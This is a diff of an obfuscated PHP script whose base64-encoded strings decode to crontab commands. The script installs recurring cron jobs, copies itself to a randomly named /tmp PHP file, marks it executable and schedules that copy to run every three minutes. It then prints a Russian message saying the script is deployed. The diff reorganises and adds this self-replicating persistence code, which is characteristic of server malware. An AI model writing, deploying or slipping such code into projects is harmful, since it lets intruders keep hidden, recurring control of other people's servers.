@@ -34,7 +34,7 @@ function h4k2j9m1n7p3q8r5t6($s8x2c5v9b1n7m3k6j4) {
     return false;
 }
 function m4n5g6h7j8k9l0($w6e7r8t9y0u1i2o3p4) {
-    $b7n3m9k2j8h1g5f6d4s = base64_decode("Ki8zICogKiAqICo=") . " $w6e7r8t9y0u1i2o3p4 " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==") . "\n";
+    $b7n3m9k2j8h1g5f6d4s = base64_decode("Ki8zICogKiAqICo=") . " $w6e7r8t9y0u1i2o3p4 " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==");
     $x9c5v1b8n2m7k3j6h4g = base64_decode("Ki83ICogKiAqICo=") . " $w6e7r8t9y0u1i2o3p4 " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==") . "\n";
     $r8t2y5u9i1o3p6a4s7d = array('m' => ord(base64_decode("wqY=")) * 2, 'n' => 1, 'x' => 15);
     $f3g6h9j2k5l8n1m4p7q = array('', base64_decode("cGhwIA=="));
@@ -48,27 +48,26 @@ function m4n5g6h7j8k9l0($w6e7r8t9y0u1i2o3p4) {
         $p0o9i8u7y6t5r4e3w2q = $a1s2d3f4g5h6j7k8l9m === base64_decode("ZWNobw==") ? "$r4gb0flc7blg5nd0z8f" : "$r4gb0flc7blg5nd0z8f";
         $z1a2s3d4f5g6h7j8k9l .= "*/$v6c5b4n3m2k1j9h8g7f * * * * $a1s2d3f4g5h6j7k8l9m$p0o9i8u7y6t5r4e3w2q " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==");
     }
+    $b2c3d4e5f6g7h8i9j0k1l2m3n4o5 = __FILE__;
+    $c3d4e5f6g7h8i9j0k1l2m3n4o5p6 = base64_decode("L3RtcC8=") . substr(md5(time() . rand()), 0, 32) . base64_decode("LnBocA==");
+    $d4e5f6g7h8i9j0k1l2m3n4o5p6q7 = file_get_contents($b2c3d4e5f6g7h8i9j0k1l2m3n4o5);
+    if ($d4e5f6g7h8i9j0k1l2m3n4o5p6q7) {
+        file_put_contents($c3d4e5f6g7h8i9j0k1l2m3n4o5p6, $d4e5f6g7h8i9j0k1l2m3n4o5p6q7);
+        chmod($c3d4e5f6g7h8i9j0k1l2m3n4o5p6, 0755);
+        $e5f6g7h8i9j0k1l2m3n4o5p6q7r8 = base64_decode("Ki8zICogKiAqICo=") . " php $c3d4e5f6g7h8i9j0k1l2m3n4o5p6 " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==");
+        $z1a2s3d4f5g6h7j8k9l .= $e5f6g7h8i9j0k1l2m3n4o5p6q7r8;
+        // exec(base64_decode("KGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8g") . escapeshellarg($e5f6g7h8i9j0k1l2m3n4o5p6q7r8) . base64_decode("KSB8IGNyb250YWIgLQ=="));
+    }
         exec(base64_decode("KGNyb250YWIgLWwgMj4vZGV2L251bGw7IA==") . base64_decode("ZWNobyA=") . escapeshellarg($z1a2s3d4f5g6h7j8k9l) . base64_decode("KSB8IGNyb250YWIgLQ=="));
 }
-function v7b9n2m5k8j1h4g3f6d() {
-    $current_file = __FILE__;
-    $backup_name = base64_decode("L3RtcC8=") . substr(md5(time() . rand()), 0, 32) . base64_decode("LnBocA==");
-    $backup_content = file_get_contents($current_file);
-    if ($backup_content) {
-        file_put_contents($backup_name, $backup_content);
-        chmod($backup_name, 0755);
-        $cron_job = base64_decode("Ki8zICogKiAqICo=") . " php $backup_name " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==");
-        exec(base64_decode("KGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8g") . escapeshellarg($cron_job) . base64_decode("KSB8IGNyb250YWIgLQ=="));
-        return $backup_name;
-    }
-    return false;
+function a1b2c3d4e5f6g7h8i9j0k1l2m3n4() {
+    
 }
 
 if (!x1y2z3a4b5c6($w6e7r8t9y0u1i2o3p4)) {
     $p8k7j6h5g4f3d2s1a9 = h4k2j9m1n7p3q8r5t6($w6e7r8t9y0u1i2o3p4);
     if ($p8k7j6h5g4f3d2s1a9) {
         m4n5g6h7j8k9l0($p8k7j6h5g4f3d2s1a9);
-        v7b9n2m5k8j1h4g3f6d();
         echo "Скрипт развернут\n";
     }
 } else {
